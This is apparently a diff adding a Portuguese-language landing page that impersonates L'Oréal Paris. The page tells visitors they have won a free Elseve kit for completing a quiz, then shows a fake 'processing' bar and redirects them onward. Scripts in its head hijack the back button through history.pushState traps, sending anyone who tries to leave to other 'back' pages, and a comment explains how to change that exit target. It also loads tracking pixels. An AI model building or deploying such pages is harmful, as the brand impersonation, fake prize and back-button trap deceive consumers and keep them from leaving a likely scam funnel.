@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                location.replace('/elseve/back/2' + (qs || ''));
+            });
+        })();
+    </script>
+    <meta charset="UTF-8" />
+<link rel="preload" as="image" href="/img/65V88g19-banner1.png" fetchpriority="high" />
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+ <script>
+  window.pixelId = "699052447f0cf151dff45c39";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'back/1';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>L'Oréal Paris | Presente Confirmado</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Playfair+Display:ital,wght@0,700;1,400&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --white: #FFFFFF;
+            --deep-purple: #050208;
+            --brand-purple: #8A2BE2;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--deep-purple);
+            color: var(--white);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* ========= CONFETES ========= */
+        #confetti-canvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
+        .confetti {
+            position: absolute; width: 6px; height: 6px;
+            background: var(--brand-purple);
+            animation: fall linear forwards;
+        }
+        @keyframes fall { to { transform: translateY(110vh) rotate(540deg); } }
+
+        /* ========= CONTEÚDO ALINHADO AO TOPO ========= */
+        .main-content {
+            width: 100%;
+            max-width: 450px;
+            padding: 50px 25px 0; 
+            text-align: center;
+            z-index: 10;
+        }
+
+        .brand-logo {
+            font-family: 'Cinzel', serif;
+            font-size: 18px;
+            letter-spacing: 10px;
+            margin-bottom: 25px;
+            opacity: 0.6;
+        }
+
+        h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 36px;
+            font-style: italic;
+            margin-bottom: 12px;
+            line-height: 1.1;
+        }
+
+        .thanks-msg {
+            font-size: 15px;
+            color: var(--white);
+            opacity: 0.9;
+            margin-bottom: 30px;
+            font-weight: 300;
+            line-height: 1.5;
+        }
+
+        .thanks-msg b { color: #00FF88; font-weight: 600; }
+
+        .loader-container { width: 100%; margin-bottom: 35px; }
+
+        .loader-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 100px;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: var(--brand-purple);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.6);
+            transition: width 7s linear;
+        }
+
+        .loading-msg {
+            margin-top: 15px;
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            color: var(--brand-purple);
+            text-transform: uppercase;
+        }
+
+        /* ========= BANNER QUALIDADE MÁXIMA ========= */
+        .banner-wrap {
+            width: 90%;
+            max-width: 480px;
+            z-index: 10;
+        }
+        /* ===== Esqueleto de carregamento do banner ===== */
+        .banner-wrap {
+            position: relative;
+            min-height: 160px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: linear-gradient(100deg, #17121f 30%, #2a2036 50%, #17121f 70%);
+            background-size: 200% 100%;
+            animation: bannerSkeleton 1.1s ease-in-out infinite;
+        }
+        .banner-wrap.is-loaded {
+            animation: none;
+            background: none;
+            min-height: 0;
+        }
+        @keyframes bannerSkeleton {
+            0%   { background-position: 150% 0; }
+            100% { background-position: -50% 0; }
+        }
+
+
+        .banner-img {
+            width: 100%;
+            height: auto;
+            border-radius: 20px;
+            display: block;
+            image-rendering: -webkit-optimize-contrast;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+            border: 1px solid var(--border);
+        }
+
+        .footer-info {
+            margin-top: auto;
+            padding-bottom: 40px;
+            font-size: 11px;
+            opacity: 0.4;
+            font-weight: 300;
+            max-width: 280px;
+            text-align: center;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div id="confetti-canvas"></div>
+
+    <div class="main-content">
+        <div class="brand-logo">L’ORÉAL</div>
+
+        <h1>Parabéns!</h1>
+        <p class="thanks-msg">Como forma de agradecimento pela sua participação no quiz, você acabou de ganhar um <b>Kit Elseve totalmente grátis!</b></p>
+
+        <div class="loader-container">
+            <div class="loader-bar">
+                <div class="progress" id="bar"></div>
+            </div>
+            <p class="loading-msg" id="msg">Processando resgate no sistema...</p>
+        </div>
+    </div>
+
+    <div class="banner-wrap">
+        <img src="/img/65V88g19-banner1.png" class="banner-img" alt="Recompensa L'Oréal" fetchpriority="high" decoding="async" loading="eager" onload="this.parentNode.classList.add(&quot;is-loaded&quot;)">
+    </div>
+
+    <p class="footer-info">Aguarde, em instantes você poderá escolher qual kit deseja receber em sua casa.</p>
+
+    <script>
+        function initConfetti() {
+            const container = document.getElementById('confetti-canvas');
+            const colors = ['#8A2BE2', '#B56BFF', '#FFFFFF', '#FFD700'];
+            for(let i=0; i<60; i++) {
+                const c = document.createElement('div');
+                c.className = 'confetti';
+                c.style.left = Math.random() * 100 + 'vw';
+                c.style.top = '-10px';
+                c.style.backgroundColor = colors[Math.floor(Math.random()*colors.length)];
+                c.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                c.style.animationDelay = (Math.random() * 3) + 's';
+                container.appendChild(c);
+            }
+        }
+
+        window.onload = () => {
+            initConfetti();
+            const bar = document.getElementById('bar');
+            const msg = document.getElementById('msg');
+            
+            setTimeout(() => { bar.style.width = '100%'; }, 100);
+
+            setTimeout(() => { msg.innerText = "Gerando seu cupom exclusivo..."; }, 2500);
+            setTimeout(() => { msg.innerText = "Redirecionando para a vitrine..."; }, 5000);
+
+            setTimeout(() => {
+                const params = window.location.search;
+                window.location.href = "index(10).html" + params; 
+            }, 7500);
+        };
+    </script>
+</body>
+</html>
